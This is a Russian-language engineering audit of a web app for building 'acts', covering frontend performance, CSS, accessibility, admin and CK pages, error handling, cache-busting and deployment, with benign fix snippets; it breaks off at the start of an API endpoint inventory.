### 8.1 Сводка цифр

| Метрика | Значение |
|---|---|
| JS-файлов всего | **92** |
| JS uncompressed | **1 230 КБ** |
| `<script src=` в `base_constructor.html` | **72** |
| CSS-файлов | **78** |
| CSS uncompressed | **387 КБ** |
| `@import` в `constructor.css` | **41** |
| addEventListener в constructor/ | **196** |
| removeEventListener в constructor/ | **31** (дисбаланс **6:1**) |
| passive: true listeners | **2** |
| Точек вызова `renderAll()` | **18** (из них 14 уникальных по логике) |
| Точек вызова `PreviewManager.update()` | **~30** |
| Прямых `style.X = ` | **~180** |
| `getBoundingClientRect/offsetWidth/Height` | **~45 точек** |

> **Метод:** статический анализ кода. Все «миллисекунды» — расчётные оценки на основе подсчёта DOM-операций и типовых стоимостей в Chromium. **Все числа требуют валидации DevTools Performance/Network профилем** перед фиксом.

### 8.2 H-RENDERALL — детальная оценка

Расчёт для типичного акта (~100 нод, ~100 ячеек, ~10 textblocks, ~5 violations) — см. §3.3.

**Per-call cost:**
- ~1 635 DOM mutations (createElement + appendChild + dataset)
- ~480 addEventListener (3 на ячейку × 100 + 80 column resize + 100 row resize)
- innerHTML='' = layout invalidation + GC старого поддерева ~3-10 мс
- layout/paint после insert'ов ~10-30 мс при сложном CSS

**Расчётный total: 15-40 мс** на типичный акт, **80-200 мс** на большой — видимый jank.

**Сравнение per-node:**

| Сценарий | renderAll() | updateNode(nodeId) |
|---|---|---|
| Изменить текст одной ячейки | 15-40 мс | ~0.05 мс (один textContent=) |
| Merge/unmerge 2 ячеек | 15-40 мс | 5-10 мс (одна таблица) |
| Insert row | 15-40 мс | 3-5 мс |
| Drag-drop ноды | 15-40 мс | 3-10 мс (две перестановки) |

**Экономия: 10-300×** на типичной операции.

### 8.3 H-SCRIPTS — Network waterfall

**72 `<script>` в `base_constructor.html`, ни один без `defer`/`async`.**

Прод: nginx → Tornado (JupyterHub) → Tornado (Datalab) → uvicorn = HTTP/1.1 повсюду. Браузеры держат 6 параллельных коннектов.

- Total round-trips: ⌈72/6⌉ = **12**

| RTT | Время на 12 серий | + парсинг + execute |
|---|---|---|
| 20 мс (локальная сеть) | 240 мс | ~400-500 мс |
| 50 мс (JupyterHub в DC) | 600 мс | **~1 000-1 200 мс** |
| 100 мс (slow WAN) | 1 200 мс | **~2 000+ мс** |

Это **точно ощутимо** — секундная пауза при открытии акта. Под HTTP/2 — один RTT для всех 72 файлов.

### 8.4 Размеры (top-30)

| Файл | КБ |
|---|---|
| portal/acts-manager/dialog-create-act.js | 56 |
| constructor/dialog/dialog-invoice.js | 47 |
| shared/api.js | 44 |
| shared/chat/chat-renderer.js | 42 |
| constructor/state/state-tree.js | 36 |
| constructor/context-menu/context-menu-cells.js | 34 |
| constructor/table/table-cells-operations.js | 34 |
| constructor/items/items-renderer.js | 33 |
| shared/chat/chat-messages.js | 32 |
| portal/acts-manager/acts-manager-page.js | 31 |
| ... | ... |

После gzip — ~250-350 КБ по сети. **Не объём, а число RTT — главная боль.**

### 8.5 Lazy-load кандидаты

| Файл | Сейчас грузится | Можно lazy? | Экономия |
|---|---|---|---|
| chat-popup + 11 chat-модулей + DOMPurify | eager | **да**, по первому клику | -12 файлов, ~150 КБ |
| dialog-invoice.js (47 КБ) | eager | **да**, по «приложить фактуру» в §5 | -47 КБ |
| dialog-help.js | eager | **да**, по клику Help | small |
| settings-menu.js | eager | **да**, по клику шестерёнки | small |
| validation/*.js (5 файлов) | eager | **да**, по save-and-export | several |
| preview/*.js (4 файла) | eager | **да**, по open side-panel | |
| textblock-toolbar.js (16 КБ) | eager | **да**, по фокусу в textblock | |
| dialog-audit-log.js | **не нужен** в конструкторе | удалить | -28 КБ |

Реалистично сократить с 12 RTT до 6-7 + сделать парсинг неблокирующим → **500-700 мс экономии** на cold-load.

### 8.6 localStorage I/O

**Объём типичного state:** ~70 КБ JSON. Большого: ~300 КБ.

**Частота:** debounce 1 сек → при активном вводе 1 setItem/сек = 60 setItem'ов/мин × 70 КБ = **4.2 МБ записи в LS за минуту**.

**Цена цикла:** `JSON.stringify(70 КБ)` ≈ 5-10 мс + `localStorage.setItem` ≈ 1-5 мс = **~10-15 мс на цикл**, 1 раз в секунду = ~1.5% main thread. На большом акте (300 КБ) — **30-60 мс/цикл = ~5% main thread**, заметно при наборе.

**Квота LS 5-10 МБ** → 50-100 актов поместится.

**Оптимизации:**
1. Дельта-сохранение — снизить байты в 10-100 раз.
2. `requestIdleCallback` вместо setTimeout для serialize.
3. WebWorker для JSON.stringify.
4. IndexedDB вместо LS — async, без квота-боли.

### 8.7 Re-paint / re-flow

Топ по style assigns:
- `table/table-sizes.js`: **60** (resize handles, оправдано)
- `header/chat-popup.js`: **10** (popup positioning, drag)
- `table-cells-operations.js`: **9** (editor над ячейкой)
- `items-renderer.js`: **8** (батч через `Object.assign`)

Forced sync layout: 45 точек, преимущественно `table-sizes.js` (11). Главное — циклов «измерил → записал → снова измерил» по grep'у не видно.

### 8.8 Event listeners — leaks

| Канал | Реальный leak? | Cost на renderAll |
|---|---|---|
| `tableManager.attachEventListeners` | Нет (GC) | **+480 addEventListener** |
| `_setupTitleEditing` | Нет (GC) | **+80 closures, +80 listeners** |
| Preview tooltip | Нет (GC) | **+10-30 listeners** на каждый update |
| LockManager activity | Нет на single-act flow | — |
| ChangelogTracker timers | Микро-утечка | — |

**Главная боль не leak, а постоянное пересоздание handler'ов.** Per-node update снимет это автоматически.

### 8.9 Рекомендации в порядке ROI

#### Quick wins (1-3 дня, низкий риск)

1. **`defer` на все 72 скрипта** — экономия 200-400 мс на DCL.
2. **`{passive: true}` на mouse/scroll/touch listener'ы** — jank при скроллинге.
3. **Дедупликация RAF в `PreviewManager.update`** (`_pendingUpdate` флаг) — 30 callback'ов → 1 при потоке ввода.
4. **Удалить мёртвый `app:state-changed` listener** в preview-menu.js.
5. **`AppConfig.preview.debounce = 150 мс`** для preview-вызовов — ~80% экономии при наборе.

#### Medium wins (1 неделя)

6. **Lazy-load chat-popup**: 11 файлов + DOMPurify по первому клику. ~150 КБ + 1 RTT.
7. **Lazy-load invoice/help/audit-log**: dynamic insert. ~80 КБ + 2-3 RTT.
8. **Дельта-сериализация для LS**: 70 КБ → 5-10 КБ JSON.stringify, 10× быстрее.
9. **`requestIdleCallback` для saveState** вместо setTimeout.

#### Big wins (2+ недель)

10. **`ItemsRenderer.updateNode(nodeId)` per-node API** — главный архитектурный долг. Экономия 10-300× на типовое изменение. Требует Playwright smoke-тестов (сейчас 0 JS-тестов).
11. **Bundle всех `static/js/` через esbuild/vite**: 72 файла → 3-5 chunks. 12 RTT → 2-3 RTT под HTTP/1.1 = 500-900 мс на cold-load.
12. **HTTP/2 на JupyterHub-proxy** — один RTT для всех 72 файлов.

---

## §9. CSS-архитектура (новая глава)

### 9.1 Сводка

- 78 файлов, 387 КБ uncompressed
- 3 entry-points: `shared.css` (14 импортов), `portal.css` (15), `constructor.css` (41)
- 4-я точка входа: `errors.css` напрямую из `base_error.html`
- `variables.css` — **572 переменные в одном файле** (29 КБ) — главный риск
- `.<class>{` определений: **710** в 65 файлах
- `!important`: **57** в 6 файлах
- Orphan CSS: **0**
- ID-селекторов: **4**

### 9.2 [HIGH] CSS-VARS-BROKEN — Сломанные CSS-переменные

| Переменная | Определена | Используется | Эффект |
|---|---|---|---|
| `--duration-fast` | **нет** в `variables.css` | **29 раз** — `chat.css:54,189`, `sidebar.css:75,95,107,145,162,204,221,255,317`, `landing.css:62` | `transition: all var(--duration-fast)` → undefined → переход мгновенный/CSS-ошибка |
| `--duration-normal` | **нет** | `landing.css:92` | то же |

В части мест указан fallback `var(--duration-fast, 150ms)` (chat-history.css, chat-blocks.css), но в `chat.css`, `sidebar.css`, `landing.css` fallback не указан — там transitions нерабочие.

**Effort:** XS (2 строки). Добавить `--duration-fast: 150ms` / `--duration-normal: 300ms` в `variables.css`.

### 9.3 [MEDIUM] CSS-VARS-SWAMP — variables.css = свалка

572 переменные в одном `:root{}`. Это уже не «design tokens», а локальные константы компонентов. Категории:
- Цвета (палитра, статусы, gray-шкала) — ~150
- **Save-indicator (один компонент!) — 35 переменных**
- Preview-меню/preview-grip — 22
- Toolbar — 14
- Tree — 13
- Typography — 18
- Spacing — 17
- Z-index — 10
- Остальное

**Дубли семантики:**
- `--accent` ≡ `--info` (`#4a9ab6`), `--accent-light` ≡ `--info-light`
- Три семейства красного: `--error #c75555`, `--danger #dc3545`, `--save-error-glow rgba(239,68,68,…)`
- Два warning: `--warning #d89849`, `#fbbf24` (Tailwind amber-400)
- `--gradient-header` ≡ `--table-header-gradient`

**Hardcoded цвета помимо шкалы:** `#f8f9fa`, `#aab9dc`, `#fff8e8`, `#f9f9f9`, `#3d4d73`, `#3d8a5a`, `#bd2130`, `#5b21b6`, `#2ecc71`, `#e74c3c`, и т.п.

**Effort:** L. Декомпозиция на `variables/colors.css`, `variables/spacing.css`, `variables/components/*.css`.

### 9.4 Cross-zone импорты

- `constructor.css:68` → `../portal/acts-manager/team-member-search.css` (используется в диалоге создания акта внутри constructor)
- `portal.css:21-24` → `../constructor/preview/*` (preview-рендер шарится для diff/version-preview)

**Recommendation:** вынести `team-member-search` в `shared/forms/` и `preview/*` в `shared/preview-renderer/`.

### 9.5 [MEDIUM] CSS-Z-INDEX — Calc'и пересекают соседние layers

Шкала `--z-base 1`, `--z-dropdown 1000`, `--z-sticky 1100`, `--z-fixed 1200`, `--z-modal-backdrop 1300`, `--z-modal 1400`, `--z-popover 1500`, `--z-tooltip 1600`, `--z-notification 1700` — **разумная**.

Магические утечки:
- `dialog-overlay.css:59` — `calc(var(--z-modal-backdrop) + 100)` = 1400 = `--z-modal`. Возможен баг порядка.
- `dialog-overlay.css:64` — `calc(var(--z-modal) + 100)` = 1500 = `--z-popover`.
- `chat-blocks.css:421` — `calc(var(--z-modal-backdrop, 1000) + 10)` fallback `1000` не совпадает с реальным `1300`.

**Effort:** S. Заменить на `--z-modal + 1` или новый токен `--z-modal-elevated`.

### 9.6 !important — не «war»

42 из 57 — в `utilities/helpers.css` (atomic-utility слой, обосновано). 6 в `read-only.css` (режим должен перебивать всё). 6 в `tree-states.css` (конкуренция с `.tree-item.selected`). 3 точечных в acts-modal/cards/version-preview. **Настоящего war нет.**

### 9.7 [MEDIUM] CSS-RESPONSIVE — Constructor не адаптивен

5 `@media` запросов на 78 файлов:
- `errors.css:135` — `max-width: 480px`
- `landing.css:334, 340, 350` — три breakpoint
- `sidebar.css:377` — `max-width: 768px`

Constructor (главная рабочая зона) **0 media queries** — расчитан на десктоп ≥1280px. Если задача — десктоп-only, зафиксировать в docs (минимальное разрешение); полу-готовые media в landing удалить.

### 9.8 [LOW] CSS-TRANSITION-ALL

`transition: all` — **38 вхождений** (антипаттерн: reflow всех свойств). 6 хардкод-длительностей вне шкалы (`0.15s`, `0.2s` в audit-log-dialog, version-preview, admin-roles).

**Effort:** S (find-replace на `--transition-fast`).

---

## §10. Accessibility (новая глава)

### 10.1 Сводка

- ARIA-coverage: **15-25 %**
- Keyboard navigation: **отсутствует** для tree, table, items-editor
- Focus management: **нет focus-trap, нет focus-restoration** в DialogBase
- WCAG-уровень: **fail** даже на A
- Положительные: `lang="ru"` везде, `:focus-visible` для 17 ключевых компонентов, кнопки везде `<button>`, `<label>` для всех input в формах

### 10.2 [HIGH] A11Y-TREE — Tree без ARIA и без клавы

**Файл:** `templates/constructor/components/tree_panel.html:4` — `<ul id="tree" class="tree">` без атрибутов.

Сейчас:
- Нет `role="tree"` на `<ul>`
- Нет `role="treeitem"`, `aria-expanded`, `aria-selected`, `aria-level`, `aria-setsize`, `aria-posinset` на узлах
- `grep "Arrow*" static/js/constructor/tree` = **0** (нет стрелочной навигации)

Главный рабочий компонент полностью мышиный. Невозможно выделить узел без клика, развернуть/свернуть Right/Left, перейти к sibling Up/Down.

**Effort:** L. Реализовать [APG Treeview Pattern](https://www.w3.org/WAI/ARIA/apg/patterns/treeview/):
- `role="tree"` на `<ul>`
- `role="treeitem"` + ARIA-атрибуты на каждом `<li>`
- Roving tabindex (`tabindex="0"` на активном, `-1` на остальных)
- Handlers: Up/Down/Left/Right/Home/End/Enter/F2

### 10.3 [HIGH] A11Y-DIALOGS — Диалоги без focus-management

**Файл:** `static/js/shared/dialog/dialog-base.js:34-71`

`_showDialog` не переводит focus внутрь, `_hideDialog` не возвращает на triggering-кнопку, focus-trap не реализован. Только `help_modal.html` имеет `role="dialog"`, нигде `aria-modal="true"`.

**Effort:** M (3 метода в DialogBase).

```js
static _showDialog(overlay) {
    overlay._previousFocus = document.activeElement;
    body.appendChild(overlay);
    overlay.classList.add('visible');
    requestAnimationFrame(() => {
        const firstFocusable = overlay.querySelector('button, [href], input, [tabindex]:not([tabindex="-1"])');
        firstFocusable?.focus();
    });
}

static _hideDialog(overlay) {
    setTimeout(() => {
        overlay.remove();
        overlay._previousFocus?.focus();
    }, this.closeDelay);
}

// Focus trap: keydown Tab handler на overlay
```

### 10.4 [HIGH] A11Y-LIVE — Notifications и Save-indicator без `aria-live`

**Файлы:** `static/js/shared/notifications.js`, `templates/constructor/header/header_save_indicator.html:7`.

Notifications создаются в DOM, но screen-reader о них не узнаёт. Save-indicator — только статическая `aria-label="Индикатор сохранности"`, динамические смены state не озвучиваются.

**Effort:** XS (атрибут на контейнере).

```html
<div class="notification-container" role="status" aria-live="polite"></div>
<!-- для error type — отдельный контейнер с aria-live="assertive" -->
```

### 10.5 [HIGH] A11Y-MOTION — `prefers-reduced-motion` = 0 вхождений

При активной `animations.css` (shake, spin, pulse, slide) пользователи с вестибулярными нарушениями страдают.

**Effort:** XS (один media query):

```css
@media (prefers-reduced-motion: reduce) {
    *, *::before, *::after {
        animation-duration: 0.01ms !important;
        animation-iteration-count: 1 !important;
        transition-duration: 0.01ms !important;
        scroll-behavior: auto !important;
    }
}
```

### 10.6 [HIGH] A11Y-TABLE — Table без grid-семантики

Стандартный `<table>` ОК для read-only, но кастомное «cells-operations» (merge, insert, delete) недоступно с клавиатуры. Нужен `role="grid"` + `aria-rowindex`/`aria-colindex` + keyboard model (APG https://www.w3.org/WAI/ARIA/apg/patterns/grid/).

### 10.7 Color contrast (выборочно)

| FG | BG | Contrast | WCAG AA |
|---|---|---|---|
| `--text-primary: #1a202c` | `--bg-primary: #ffffff` | ~16.4:1 | PASS |
| `--text-secondary: #4a5568` | `--bg-primary` | ~8.6:1 | PASS |
| `--text-tertiary: #9ba3b3` | `--bg-primary` | ~3.0:1 | **FAIL** для normal |
| `--text-disabled: #cfd4dc` | `--bg-primary` | ~1.7:1 | FAIL (но disabled — допустимо) |
| `--warning: #d89849` | `--bg-primary` | ~2.5:1 | FAIL для текста |
| `--success: #52a876` | `--bg-primary` | ~3.0:1 | FAIL для normal |

`--text-tertiary` используется как `--input-placeholder` — placeholder ниже AA. Усилить до `#7a8290` → ~4.6:1.

### 10.8 Прочее

- `<main>` отсутствует в `constructor/base_constructor.html:21` (есть в portal). MEDIUM.
- Emoji в заголовках/context-menu (`📝 Структура акта`, `➕📊⚠️`) — скринридер прочитает имя символа. Обернуть в `<span aria-hidden="true">…</span>`.
- 37 inline SVG без `aria-hidden`/`<title>`. Для декоративных — добавить `aria-hidden="true"`.
- Звёздочка `*` в формах без `aria-required="true"`.
- Validation errors не связаны с input через `aria-describedby` — скринридер не поймёт какое поле сломалось.

---

## §11. Admin + CK страницы (новая глава)

### 11.1 Admin (`/admin`)

#### Inventory

| Файл | Строк | Роль |
|---|---|---|
| `app/domains/admin/routes/portal.py` | 35 | HTML-роут (без серверного `require_admin`) |
| `app/domains/admin/api/roles.py` | 124 | REST API, все с `dependencies=[_admin]` |
| `templates/portal/admin/admin.html` | 66 | Шаблон |
| `static/js/portal/admin/admin-page.js` | 52 | Контроллер |
| `static/js/portal/admin/admin-roles.js` | 348 | Таблица ролей, фильтры, сортировка, оптимистичный toggle |
| `static/js/portal/admin/admin-add-user-dialog.js` | 220 | Поиск + assign role (debounce 300мс) |
| `static/js/portal/admin/admin-search.js` | 34 | Дебаунс-обёртка (250мс) |

**Всего:** 654 строк JS, 364 CSS, 66 HTML, 159 Python.

#### API endpoints

| Endpoint | Method | Используется фронтом |
|---|---|---|
| `/api/v1/admin/roles` | GET | да |
| `/api/v1/admin/users/directory` | GET | да |
| `/api/v1/admin/users/search?q=` | GET | да |
| `/api/v1/admin/users/{u}/roles` | GET | **НЕТ** (есть directory со всеми ролями) |
| `/api/v1/admin/users/{u}/roles` | POST | да |
| `/api/v1/admin/users/{u}/roles/{rid}` | DELETE | да |
| `/api/v1/admin/audit-log` | GET | **НЕТ** (UI отсутствует) |

#### Находки admin

| # | Severity | Файл | Проблема |
|---|---|---|---|
| **A1** | **HIGH** | `portal.py:15-34` | `GET /admin` отдаёт страницу любому залогиненному; не-админ видит «битый» UI с 403 на api-вызовах. |
| **A2** | MED | `admin-page.js:23-26` | Любая ошибка init даёт одно сообщение «Не удалось загрузить». Разветвить по error.status (403/5xx/network). |
| **A3** | MED | `admin-roles.js:274-306` | Оптимистичное обновление UI откатывается при ошибке, но `_users` не обновляется при отказе — рассинхрон с БД при race. |
| **A4** | LOW | `admin-add-user-dialog.js:111` | `searchUsers` без AbortController. Если диалог закрылся во время запроса — обработчик пишет в detached element. |
| **A5** | LOW | `admin-add-user-dialog.js:134-137` | Ошибка поиска показывается в результатах без Notifications.error. |
| **A8** | INFO | `roles.py:102-123` + JS | `/admin/audit-log` существует, фронт не использует. Решить: добавить UI или удалить. |

**Fix A1 (приоритет):** добавить `Depends(require_admin())` на `show_admin_page`.

### 11.2 CK страницы

#### Inventory

| Зона | Файлы | Строк |
|---|---|---|
| Backend CE | routes/portal.py (29) + api/records.py (95) + api/dictionaries.py (33) | 157 |
| Backend FR | routes/portal.py (29) + api/records.py (95) + api/dictionaries.py (34) | 158 |
| JS CE page | 186 |
| JS CE config | 71 |
| JS FR page | 200 |
| JS FR config | 103 |
| Shared CK JS | ck-table (223) + ck-pagination (121) + ck-form (466) + ck-process-picker (172) | **982** |
| Templates | ck_client_experience.html (71) + ck_fin_res.html (71) | 142 |
| CSS | 450 |

#### L2 — насколько похожи CE и FR

**Подтверждено** (NEW-4): **~100 % логическое дублирование инфраструктуры.**

- **Templates**: отличаются 4 строки (title, 2 path к js, init class).
- **Backend routes**: отличаются URL/имя шаблона/active_page/topbar_title/domain_name.
- **Backend api/records**: отличаются именем домена в `require_domain_access`, имени схем (`CSValidationCreate` vs `FRValidationCreate`), имени сервиса, logger.
- **Frontend page.js**: идентичная логика, отличается только именами классов и форматированием (FR-страница имеет лишние `{}` и комментарии-разделители).
- **Frontend config.js**: `formatDate/formatNumber/formatTerbank` идентичны байт-в-байт. `columns` идентичны. Реальный delta — только `fields[]` (у FR +12 полей) + 1 справочник `risk_types`.

#### Находки CK

| # | Severity | Проблема | Effort |
|---|---|---|---|
| **C1** | **HIGH** | `ck-client-exp-page.js` ↔ `ck-fin-res-page.js` (386 строк дублирования) | M — `CkPage` базовый класс в `shared/ck/ck-page.js`, принимать config |
| C2 | MED | `_loadData` грузит ВСЕ записи без серверной пагинации (хотя бэк поддерживает) | M |
| C3 | MED | `Promise.all` без AbortController при switch CE↔FR (full reload снимает проблему) | L |
| C4 | MED | `ck-form.js:64-65` — пустое значение number-поля = `0` вместо `null`; пользователь не «снимает» значение | S |
| C5 | MED | `ck-form.js:357-369` — legacy-значение справочника подкладывается без подсветки «устарело» | S |
| C6 | MED | `ck-table.js:111-114` — empty-state одинаков для «реально пусто» и «фильтр не дал результата» | S |
| C7 | LOW | `ck-pagination.js:76` — магическое число `7 страниц`, нет «...» при >7 | S |
| C8 | LOW | `ck-pagination.js` — inline-стили через `btn.style.*`, не CSS | M |
| C9 | LOW | `ck-form.js:411-432` — KM-маска дублирует логику из acts-manager | M |
| C10 | LOW | `ck-fin-res-config.js:7-14` — глобальные `const` в module-scope без `window.X` | S |
| C11 | LOW | `ck-form.js:51-84` — `getElementById` напрямую, не через `containerEl.querySelector` | S |
| C12 | INFO | inline стили на кнопках в HTML | S |
| C13 | INFO | Лишние эндпоинты dictionaries, фронт не дёргает | INFO |
| C14 | INFO | `clear()` vs `renderEmpty()` — confusing именование | S |

---

## §12. Error handling (новая глава)

### 12.1 Карта try/catch

- Файлов с `try {`: **39**
- Total `try` блоков: **163**
- Total `catch (`: **129**
- Полностью пустые catch: **1** (`chat-client-actions.js:114` для sessionStorage — приемлемо)
- `.catch(() => {})`-форма silent: **3**, из них один CRITICAL — H-SILENT-1 ниже.

### 12.2 [HIGH] H-BOUNDARY — Глобальные error boundaries отсутствуют

`grep "window.onerror|unhandledrejection|window.addEventListener('error'"` → **0 матчей** в `static/js/`.

Любая необработанная Promise rejection → silent в DevTools. Любая sync-ошибка (`TypeError`, `ReferenceError` в handler) → silent (browser console only). Sentry/телеметрии нет.

**Effort:** XS.

```js
// shared/error-boundary.js
window.addEventListener('error', (e) => {
    console.error('[GlobalError]', e.error || e.message, e.filename, e.lineno);
    if (typeof Notifications !== 'undefined') {
        Notifications.error('Произошла непредвиденная ошибка. Обновите страницу.');
    }
});
window.addEventListener('unhandledrejection', (e) => {
    console.error('[UnhandledPromise]', e.reason);
});
```

### 12.3 [HIGH] H-TIMEOUT — Нет fetch timeout

`grep AbortController` в `api.js` → **0**. Если бэк зависнет — fetch висит до браузерного default (минуты).

**Effort:** S. Wrapper `apiFetch(url, opts, timeout=30000)` через AbortController.

### 12.4 [HIGH] H-422 — 422-ответы FastAPI рендерятся как `[object Object]`

FastAPI шлёт `{"detail": [{"loc":..., "msg":..., "type":...}]}`. `body.detail` массив → `Notifications.error('Ошибка: ${err.message}')` отображает `Ошибка: [object Object]`. Пользователь не понимает, какое поле невалидно.

**Effort:** S. В `_throwApiError` если `body.detail` массив — `detail.map(d => d.msg).join('; ')`.

### 12.5 Топ-10 silent fails

| # | Severity | File:line | Что | Impact |
|---|---|---|---|---|
| H-SILENT-1 | **CRIT** | `version-preview.js:305` | `unlockAct().catch(() => {})` | Акт может остаться залочен — другие юзеры получат «занят» |
| H-SILENT-2 | **HIGH** | `api.js:472-475` `_saveDefaultStructure` | `catch (err) { console.error(...); /* не бросаем */ }` | Пользователь думает «сохранено», при перезагрузке акт пустой |
| H-BOUNDARY | **HIGH** | глобально | Нет window.onerror | Юзер в недоумении почему «кнопка не работает» |
| H-TIMEOUT | **HIGH** | `api.js` повсюду | Нет fetch timeout | Юзер ждёт минуты без фидбека |
| H-422 | **HIGH** | `api.js` 4xx | 422 = `[object Object]` | Юзер не понимает какое поле невалидно |
| H6 | MED | `admin-roles.js:299-305` | Rollback без детального message | «Ошибка: » при пустом message |
| H7 | MED | `lock-manager.js:237,251` extendLock | `catch ... return false` silent | Автопродление тихо отвалится, лок истечёт |
| H8 | MED | `dialog-invoice.js:182-184` | `console.error('Ошибка загрузки конфига фактур')` без Notifications | Диалог пустой, юзер не понимает |
| H9 | MED | `chat-stream.js:153-155` resume catch | `console.error('resume не удался')` без UI-маркера | Юзер думает чат «завис», шлёт ещё раз |
| H10 | MED | `dialog-invoice.js:1152-1153,1171-1172` verify/save warn | `console.warn(...)` без UI | Save после attach может тихо упасть — фактура в UI, в БД нет |

### 12.6 Loading / empty states

| Операция | Loader? |
|---|---|
| Admin `AdminPage.init` | НЕТ |
| Admin search в диалоге | ✅ |
| CK `_loadData/_loadDictionaries` | НЕТ |
| CK form save/delete | НЕТ |
| Constructor `generateAct` | НЕТ (только Notifications.info) |
| Acts-manager list load | ✅ error-state, нет loading-state |
| Chat send | ✅ placeholder bubble |
| Audit-log dialog | ✅ |
| Versions list | ✅ |
| Version-preview diff | ✅ |
| Lock extend | НЕТ (фоновый) |

Дисбаланс: на 5+ операций нет loaders. У каждого диалога свой `*-loading` класс, нет единого `.app-spinner`.

### 12.7 Network error handling

**Что есть:** `_throwApiError` парсит JSON `.detail`, fallback на HTML error page. Differential 403/404 в `loadActContent`/`saveActContent`/`deleteAct`.

**Что отсутствует:**
- Timeout: 0
- Retry: 0 (LLM-retry есть только на бэке)
- Offline detection: 0 (`navigator.onLine`, offline-event не используется)
- 5xx vs 4xx: единый поток `_throwApiError`, без шанса на retry для 503

### 12.8 Notifications usage

| Метод | Total | Top consumers |
|---|---|---|
| `Notifications.error` | ~106 | acts-manager-page, context-menu-cells, dialog-invoice, table-cells-operations |
| `Notifications.success` | ~50 | acts-manager-page, ck-*-page, admin-add-user, dialog-create-act |
| `Notifications.warning` | ~15 | storage-manager, lock-manager (read-only) |
| `Notifications.info` | ~16 | acts-manager-page, dialog-create-act, api.js |

187 вызовов в 31 файле. CK/admin — ~10 % от объёма; основная масса — constructor.

---

## §13. Build / Deploy / Cache-busting (новая глава)

### 13.1 Static files serving

`app/main.py:344-348` — `app.mount("/static", StaticFiles(...))`. Starlette ставит `last-modified` + `etag`, **НЕ ставит `Cache-Control`**. Браузер применяет эвристическое кеширование (RFC 7234 §4.2.2): обычно `(now - last_modified) × 0.1`.

Middleware-цепочка пропускает статику через rate-limit (1024 req/min/IP) — для статики лишняя нагрузка; при инкогнито-cold-load одной страницы конструктора (~170 запросов JS+CSS) съест почти 17 % окна одного пользователя.

### 13.2 [HIGH] H-CACHE — Cache-busting не настроен

124 ссылки `url_for('static', ...)` в templates без query/hash. Сразу после выкатки правок:
- Юзер может не увидеть изменения вовсе (если файл недавно не менялся и закеширован «свеже»).
- Может увидеть **рассинхрон**: HTML обновился, JS — нет → `undefined is not a function`. Особенно неприятно при mismatch между `chat-event-bus.js` и его потребителями.
- Лечение через Ctrl+F5 на каждой странице — «бесит особенно на JupyterHub».

#### Вариант 1: `?v={app_version}` query (Recommended)

В `app/core/config.py` уже есть `app_version: str = "1.0.0"`. Добавить в jinja-globals (`app/core/templating.py`) переменную `app_version`, переписать base templates на `{{ url_for('static', path='...') }}?v={{ app_version }}`.

**Pro:** ~10 правок в `base_portal.html` + `base_constructor.html`. Один централизованный bump перед деплоем. Под proxy работает без изменений.
**Con:** между деплоями версия не меняется — для dev-цикла бесполезно (но в dev есть uvicorn `reload=True`, кеш проблема только в prod).

**Effort:** S / 1-2ч.

#### Вариант 2: mtime-хеш per-file

```python
def static_url(path: str) -> str:
    abs_path = settings.static_dir / path
    try:
        v = int(abs_path.stat().st_mtime)
    except OSError:
        v = 0
    return f"/static/{path}?v={v}"
```

**Pro:** каждый файл инвалидируется отдельно. Работает и в dev.
**Con:** stat() на ~30 файлов на каждый рендер; меняет API (124 ссылки переписать).

**Effort:** M / 4-6ч.

#### Вариант 3: build-step с hash в имени файла

`chat-messages.a3f9b1.js`. Требует Python-скрипт preBuild + manifest.json.

**Pro:** «правильно» по индустрии. `Cache-Control: max-age=31536000, immutable`.
**Con:** ломает «без бандлера» принцип; build-step которого избегали; усложняет git diff.

**Effort:** L / 1-2 дня.

**Рекомендация:** Вариант 1 — минимальное изменение, закрывает 80 % проблемы (синхронность всех файлов на одной версии = нет mismatch).

### 13.3 Version в UI отсутствует

`GET /api/v1/system/version` существует, **не используется фронтом**. Версия не отображается ни в topbar, ни в footer. При rollback пользователь не поймёт что версия откатилась.

**Fix (S):** добавить `app_version` в jinja-globals + meta-tag в base templates + label в `topbar.html`. Один артефакт даёт сразу (а) видимость версии и (б) переменную для Варианта 1 cache-busting.

### 13.4 Source maps

- Минификации нет (~92 .js файла «как есть», кроме `purify.min.js`).
- Source maps нет. `purify.min.js` ссылается на отсутствующий `.map` → перманентный 404 в DevTools.

**Fix:** положить `purify.min.js.map` рядом ИЛИ удалить `//# sourceMappingURL=...` строку.

### 13.5 Bundler — анализ

92 JS-файла, ~50 одновременно на странице constructor через 72 `<script>`-тега.

**Реальное ограничение:** все singleton-публикации в `window.X` (CLAUDE.md). Переход на бандл означает либо:
- (a) Сохранить старый стиль `window.X = ...` → бандл просто конкатенация (`cat *.js > bundle.js`); ничего не теряем, не сильно выигрываем.
- (b) Переписать на ESM `import/export` → load-bearing рефакторинг 90 файлов + тесты.

**Рекомендация:** не внедрять сейчас. Ценность только в cold-load, лечится HTTP/2 + cache-busting. Если в будущем нужно — esbuild + (a) даст ~3× ускорение одной правкой Dockerfile.

### 13.6 CI/CD отсутствует

- `.github/` — нет
- `.gitlab-ci.yml` — нет
- `Dockerfile` — нет
- `scripts/launch_datalab.py` — единственный «деплой-скрипт»: интерактивно делает `kinit` и `python -m app.main` через subprocess.

Деплой ручной: каждый разработчик в JupyterHub перезапускает `launch_datalab.py` в своём space. Multi-environment promotion (dev → staging → prod) не формализован.

**Минимум:** `.github/workflows/test.yml` с pytest + ruff на PR.

### 13.7 Monitoring

Frontend error tracking: **0** (нет Sentry/Rollbar/самописного). RUM: нет.

Бэкенд: `HttpMetricsMiddleware` пишет в БД, есть `/api/v1/admin/diagnostics` (admin-only) — но фронт не подключён.

**Fix (M):** простой endpoint `POST /api/v1/system/client-error` с rate-limit + `window.onerror` хук на фронте. Дополнительно — подключить `/admin/diagnostics` в админ-панель.

### 13.8 Dependencies

`package.json` нет (явно в `.gitignore`: «не использовать npm»). Единственная vendor — `static/vendor/dompurify/purify.min.js` (версия 3.4.2, актуальная).

При CVE в DOMPurify нет автоматического уведомления.

### 13.9 Топ-5 quick wins для deploy

1. **[HIGH] Cache-busting Вариант 1** — 1-2ч.
2. **[HIGH] Версия в UI** — meta-tag + label в topbar.
3. **[MEDIUM] Минимальный CI** — `.github/workflows/test.yml` pytest + ruff.
4. **[MEDIUM] Frontend error logging** — `window.onerror` → POST endpoint.
5. **[LOW] Source map для DOMPurify** — положить или удалить строку.

---

## §14. Backend API contracts (новая глава)

### 14.1 Полный inventory

**Всего: 53 endpoints** (shared 9 + acts 24 + admin 7 + chat 11 + ck_client_exp 6 + ck_fin_res 6).

#### Shared

| Method | URL | Auth | Role | Called from frontend |
|---|---|---|---|---|
